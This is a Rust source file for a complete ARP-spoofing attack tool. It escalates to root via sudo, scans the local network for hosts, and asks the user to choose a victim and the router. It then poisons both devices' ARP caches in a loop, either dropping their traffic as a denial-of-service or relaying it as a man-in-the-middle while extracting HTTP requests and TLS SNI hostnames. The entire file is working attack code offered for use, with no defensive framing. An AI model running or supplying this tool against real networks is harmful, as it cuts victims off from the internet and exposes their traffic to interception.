use std::collections::HashMap;
use std::convert::Infallible;
use std::io::stdin;
use std::net::{IpAddr, Ipv4Addr};
use std::str::FromStr;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use anyhow::{anyhow, bail};
use etherparse::{
    ArpHardwareId, ArpOperation, ArpPacket, ArpPacketSlice, EtherType, IpNumber, Ipv4Slice,
    PacketBuilder, SlicedPacket, TcpSlice,
};
use ipnet::IpNet;
use pnet::datalink::{self, Channel, NetworkInterface};
use pnet::util::MacAddr;
use tokio::sync::Notify;
use tokio::sync::mpsc::{UnboundedReceiver, UnboundedSender};

use std::env;
use std::process::{Command, exit};

const SPOOF_INTERVAL: Duration = Duration::from_secs(1);

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    if !is_root() {
        println!("Requesting elevated privileges...");
        relaunch_with_sudo();
    }

    let interface = list_interfaces();
    let (tx, rx) = async_datalink_channel(&interface);
    let (device, router) = discover_and_select(interface.clone(), tx.clone(), rx).await;
    println!("will attack {} at: {}", device.name, device.ip);

    match Attack::from_stdin()? {
        Attack::DoS => {
            dos_victim(device, router, interface, tx).await?;
        }
        Attack::MITM => {
            man_in_the_middle(device, router, interface).await?;
        }
    };

    Ok(())
}

/// Send ARP replies to the victim device claiming that we are the router
/// Send ARP replies to the router claiming we are the victim
/// Simply by not forwarding any packets, the victim will not be able to access any internet service
async fn dos_victim(
    victim: Device,
    router: Device,
    interface: NetworkInterface,
    tx: UnboundedSender<Vec<u8>>,
) -> anyhow::Result<Infallible> {
    println!("starting DoS attack... use Ctrl+C to stop");
    let spoof_router = arp_spoof_loop(
        victim.clone(),
        router.clone(),
        interface.clone(),
        tx.clone(),
    );
    let spoof_victim = arp_spoof_loop(
        router.clone(),
        victim.clone(),
        interface.clone(),
        tx.clone(),
    );

    tokio::select! {
        r = spoof_router => r,
        r = spoof_victim => r,
    }
}

/// Send ARP replies to the victim device claiming that we are the router
/// Send ARP replies to the router claiming we are the victim
/// Act as proxy Between the victim and the router:
///     - all traffic from victim to the router will be INSPECTED then FORWARDED to the router
///     - all traffic from the router to the victim will be INSPECTED then FORWARDED to the victim
async fn man_in_the_middle(
    victim: Device,
    router: Device,
    interface: NetworkInterface,
) -> anyhow::Result<()> {
    println!("starting Man-In-The-Middle attack... use Ctrl+C to stop");
    let (tx, mut rx) = async_datalink_channel(&interface);
    let (dpi_tx, mut dpi_rx) = tokio::sync::mpsc::unbounded_channel::<Vec<_>>();

    let spoof_router = arp_spoof_loop(
        victim.clone(),
        router.clone(),
        interface.clone(),
        tx.clone(),
    );
    let spoof_victim = arp_spoof_loop(
        router.clone(),
        victim.clone(),
        interface.clone(),
        tx.clone(),
    );

    // inspect packets between the victim and the router
    let dpi = async move {
        while let Some(packet) = dpi_rx.recv().await {
            inspect_tcp_payload(&packet);
        }
    };

    let proxy = async move {
        let victim_mac = victim.mac.octets();
        let router_mac = router.mac.octets();
        let my_mac = interface.mac.unwrap().octets();
        while let Some(mut packet) = rx.recv().await {
            let Ok(ethernet) = SlicedPacket::from_ethernet(&packet) else {
                continue;
            };

            let Some(etherparse::LinkSlice::Ethernet2(ref link)) = ethernet.link else {
                continue;
            };

            let src_mac = link.source();
            let dst_mac = link.destination();
            drop(ethernet);
            if src_mac == victim_mac && dst_mac == my_mac {
                // inspect and forward to router
                packet[0..6].copy_from_slice(&router_mac); // destination: the real router
            } else if src_mac == router_mac && dst_mac == my_mac {
                // inspect and forward to victim
                packet[0..6].copy_from_slice(&victim_mac); // destination: intended recipient (victim)
            } else {
                continue; // DROP
            }

            packet[6..12].copy_from_slice(&my_mac); // source: us
            let _ = dpi_tx.send(packet.clone());
            let _ = tx.send(packet);
        }
    };

    Ok(tokio::select! {
        r = spoof_router => {r?;},
        r = spoof_victim => {r?;},
        _ = proxy => {}
        _ = dpi => {}
    })
}

/// Lie to `target` that we are `victim`
fn arp_spoof(
    victim: &Device,
    target: &Device,
    interface: &NetworkInterface,
    tx: &UnboundedSender<Vec<u8>>,
) -> anyhow::Result<()> {
    if target.ip == victim.ip {
        return Ok(());
    }

    let reply = make_arp(
        &interface,
        victim.ip.into(),
        target.ip.into(),
        target.mac,
        ArpOperation::REPLY,
    )?;
    let _ = tx.send(reply);

    Ok(())
}

/// Lie to `target` that we are `victim` in a loop
async fn arp_spoof_loop(
    victim: Device,
    target: Device,
    interface: NetworkInterface,
    tx: UnboundedSender<Vec<u8>>,
) -> anyhow::Result<Infallible> {
    loop {
        arp_spoof(&victim, &target, &interface, &tx)?;
        tokio::time::sleep(SPOOF_INTERVAL).await;
    }
}

#[allow(non_snake_case)]
enum Attack {
    DoS,
    MITM,
}

impl Attack {
    fn from_stdin() -> anyhow::Result<Self> {
        let attack: String = read_value("choose an attack: dos, mitm ");
        match attack.as_str() {
            "dos" => Ok(Self::DoS),
            "mitm" => Ok(Self::MITM),
            _ => bail!("invalid input"),
        }
    }
}

async fn discover_and_select(
    interface: NetworkInterface,
    tx: UnboundedSender<Vec<u8>>,
    mut rx: UnboundedReceiver<Vec<u8>>,
) -> (Device, Device) {
    let discovered_devices = Arc::new(Mutex::new(HashMap::new()));

    // send an arp request to each possible device in the network at fixed intervals.
    // This should trigger those device to send ARP replies to us to allow us to discover who's on the network.
    // This is not a stealthy approach (very easily detectable by anyone analyzing the network traffic)
    let c_interface = interface.clone();
    let c_discovered_devices = discovered_devices.clone();
    let c_tx = tx.clone();
    let arp_sender = tokio::spawn(async move {
        loop {
            send_arp_requests(
                c_interface.clone(),
                c_tx.clone(),
                c_discovered_devices.clone(),
            );
            tokio::time::sleep(Duration::from_secs(1)).await
        }
    });

    // wait for ARP replies and learn about the different hosts in the network
    let stop_discovery = Arc::new(Notify::new());
    let c_stop_discovery = stop_discovery.clone();
    let c_devices = discovered_devices.clone();
    let discovery = async move {
        println!("Scanning network... Press ENTER to stop:");
        let mut index = 0;
        while let Some(packet) = tokio::select! {
            r = rx.recv() => r,
            _ = stop_discovery.notified() => None,
        } {
            match SlicedPacket::from_ethernet(&packet) {
                Ok(p) => {
                    let mut devices = c_devices.lock().unwrap();
                    if let Some(payload) = p.ether_payload()
                        && payload.ether_type == EtherType::ARP
                    {
                        let a = ArpPacketSlice::from_slice(payload.payload).unwrap();
                        let ip = a.sender_protocol_addr();
                        let mac = a.sender_hw_addr();
                        let mac = MacAddr::new(mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
                        let ip = Ipv4Addr::new(ip[0], ip[1], ip[2], ip[3]);
                        let name = dns_lookup::lookup_addr(&IpAddr::V4(ip))
                            .unwrap_or(String::from("unknown"));
                        let device = Device {
                            index,
                            name,
                            ip,
                            mac,
                        };

                        if !devices.contains_key(&ip) {
                            println!("{index}: {} at {}", device.name, device.ip);
                            index += 1;
                            let _ = devices.insert(ip, device);
                        }
                    }
                }
                Err(_) => continue,
            }
        }
    };

    // wait for user input
    std::thread::spawn(move || {
        let mut d = String::new();
        stdin().read_line(&mut d).expect("must not fail");
        c_stop_discovery.notify_waiters();
    });

    // once user input is read stop the discovery process
    tokio::select! {
        _ = arp_sender => {},
        _ = discovery => {},
    }

    let devices = discovered_devices.lock().unwrap();
    let devices: Vec<_> = devices.values().cloned().collect();

    let victim: u32 = read_value("select victim:");
    let router: u32 = read_value("select router:");

    let victim = devices
        .iter()
        .find(|item| item.index == victim)
        .unwrap()
        .clone();

    let router = devices
        .iter()
        .find(|item| item.index == router)
        .unwrap()
        .clone();
    (victim, router)
}

fn send_arp_requests(
    interface: NetworkInterface,
    tx: UnboundedSender<Vec<u8>>,
    discovered_devices: Arc<Mutex<HashMap<Ipv4Addr, Device>>>,
) {
    tokio::runtime::Handle::current().spawn_blocking(move || {
        let ips = interface.ips.clone();
        const TARGET_MAC: [u8; 6] = [0xff; 6];
        for ip in ips {
            if ip.is_ipv6() {
                continue;
            }
            let network = IpNet::new(ip.network(), ip.prefix()).unwrap();

            for host in network.hosts() {
                let IpAddr::V4(host_v4) = host else {
                    continue;
                };
                if !discovered_devices.lock().unwrap().contains_key(&host_v4) {
                    let _ = match make_arp(
                        &interface,
                        ip.ip(),
                        host,
                        TARGET_MAC.into(),
                        ArpOperation::REQUEST,
                    ) {
                        Ok(packet) => tx.send(packet),
                        Err(e) => {
                            println!("failed to create arp packet:  {e}");
                            continue;
                        }
                    };
                }
            }
        }
    });
}

fn async_datalink_channel(
    dev: &NetworkInterface,
) -> (UnboundedSender<Vec<u8>>, UnboundedReceiver<Vec<u8>>) {
    let (mut tx, mut rx) = match datalink::channel(&dev, Default::default()) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!("An error occurred when creating the datalink channel: {e}"),
    };

    let (sender_tx, mut sender_rx) = tokio::sync::mpsc::unbounded_channel::<Vec<_>>();
    let (receiver_tx, receiver_rx) = tokio::sync::mpsc::unbounded_channel();

    std::thread::spawn(move || {
        while let Ok(packet) = rx.next() {
            let _ = receiver_tx.send(packet.to_vec()); // not great.. the packet is cloned :(
        }
    });

    tokio::spawn(async move {
        while let Some(packet) = sender_rx.recv().await {
            if let Some(_r) = tx.send_to(&packet, None) {
                // let _ = r.inspect_err(|e| println!("failed to send packet {e}"));
            }
        }
    });

    (sender_tx, receiver_rx)
}

fn make_arp(
    dev: &NetworkInterface,
    sender: IpAddr,
    dest: IpAddr,
    dest_mac: MacAddr,
    operation: ArpOperation,
) -> anyhow::Result<Vec<u8>> {
    let (IpAddr::V4(dest), IpAddr::V4(src)) = (dest, sender) else {
        return Err(anyhow!("ipv6 not supported"));
    };

    let src_mac = dev
        .mac
        .ok_or(anyhow!("interface has no mac address"))?
        .octets();

    let arp = ArpPacket::new(
        ArpHardwareId::ETHERNET,
        EtherType::IPV4,
        operation,
        &src_mac,
        &src.octets(),
        &dest_mac.octets(),
        &dest.octets(),
    )?;

    let b = PacketBuilder::ethernet2(src_mac, dest_mac.octets()).arp(arp);
    let mut result = Vec::<u8>::with_capacity(b.size());
    b.write(&mut result).unwrap();
    Ok(result)
}

fn is_root() -> bool {
    unsafe { libc::geteuid() == 0 }
}

fn relaunch_with_sudo() -> ! {
    let exe = env::current_exe().expect("Failed to get current exe");
    let args: Vec<String> = env::args().skip(1).collect();

    let status = Command::new("sudo")
        .arg(exe)
        .args(args)
        .status()
        .expect("Failed to execute sudo");

    exit(status.code().unwrap_or(1));
}

fn list_interfaces() -> NetworkInterface {
    let interfaces = pnet::datalink::interfaces();
    interfaces.iter().enumerate().for_each(|(i, dev)| {
        println!("{i}: {dev}");
    });
    let index: usize = read_value("choose a network interface:");
    interfaces[index].clone()
}

fn read_value<T>(prompt: &str) -> T
where
    T: FromStr,
    <T as FromStr>::Err: std::fmt::Debug,
{
    let mut value = String::new();
    println!("{prompt}");
    stdin().read_line(&mut value).expect("must not fail");
    value.trim_end().parse::<T>().expect("must not fail")
}

#[allow(unused)]
#[derive(Debug, Clone)]
struct Device {
    index: u32,
    name: String,
    ip: Ipv4Addr,
    mac: MacAddr,
}

use etherparse::Ethernet2HeaderSlice;
use tls_parser::{
    TlsExtension, TlsMessage, TlsMessageHandshake, parse_tls_client_hello_extension,
    parse_tls_plaintext,
};

pub enum PayloadType {
    Http,
    Https(String), // SNI
    Unknown,
}

pub fn inspect_tcp_payload(ethernet_frame: &[u8]) -> PayloadType {
    // Parse Ethernet header
    let eth = match Ethernet2HeaderSlice::from_slice(ethernet_frame) {
        Ok(h) => h,
        Err(_) => return PayloadType::Unknown,
    };

    // Only handle IPv4 (EtherType 0x0800)
    if eth.ether_type() != EtherType::IPV4 {
        return PayloadType::Unknown;
    }

    // Parse IPv4 header
    let ipv4 = match Ipv4Slice::from_slice(&ethernet_frame[eth.slice().len()..]) {
        Ok(h) => h,
        Err(_) => return PayloadType::Unknown,
    };

    // Only handle TCP (protocol = 6)
    if ipv4.header().protocol() != IpNumber::TCP {
        return PayloadType::Unknown;
    }

    // Parse TCP header
    let tcp = match TcpSlice::from_slice(ipv4.payload().payload) {
        Ok(h) => h,
        Err(_) => return PayloadType::Unknown,
    };

    // Detect HTTP
    let tcp_payload = tcp.payload();
    if let Ok(text) = std::str::from_utf8(tcp_payload) {
        let methods = [
            "GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH", "CONNECT",
        ];
        if text.starts_with("HTTP/") {
            return PayloadType::Http;
        } else if methods.iter().any(|m| text.starts_with(m)) {
            return PayloadType::Http;
        }
    }

    //  Detect HTTPS (TLS) and extract SNI
    if let Ok((_, record)) = parse_tls_plaintext(tcp_payload) {
        for msg in record.msg {
            if let TlsMessage::Handshake(TlsMessageHandshake::ClientHello(ch)) = msg {
                if let Some(extensions) = ch.ext {
                    if let Some(sni) = extract_sni_from_exts(extensions) {
                        println!("detected sni: {sni}");
                    }
                }
            }
        }
    }

    PayloadType::Unknown
}

fn extract_sni_from_exts(mut ext_bytes: &[u8]) -> Option<String> {
    while !ext_bytes.is_empty() {
        match parse_tls_client_hello_extension(ext_bytes) {
            Ok((rest, ext)) => {
                ext_bytes = rest;
                if let TlsExtension::SNI(sni) = ext {
                    // This gives you a slice of server-name list
                    if let Some((_, hostname)) = sni.get(0) {
                        return str::from_utf8(hostname).map(|i| i.to_owned()).ok();
                    }
                }
            }
            Err(_) => break,
        }
    }
    None
}
